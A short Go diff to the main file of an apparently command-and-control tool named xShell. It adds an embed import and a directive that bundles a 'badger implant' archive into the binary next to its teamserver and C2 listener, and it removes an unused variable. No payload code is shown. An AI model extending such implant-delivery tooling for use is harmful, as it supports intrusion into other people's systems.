@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"crypto/x509"
+	"embed"
 	"encoding/pem"
 	"log"
 	"os"
@@ -10,6 +11,11 @@ import (
 	"xShell/controller/logger"
 	"xShell/controller/teamserver"
 )
+
+// Embedded badger implant
+//
+//go:embed badger.tar.gz
+var badger embed.FS
 
 const (
 	confDir        = ".xshell/"
@@ -22,7 +28,6 @@ const (
 )
 
 var (
-	err      error
 	ts       teamserver.TeamServer = teamserver.TeamServer{}
 	listener c2.C2                 = c2.C2{}
 )
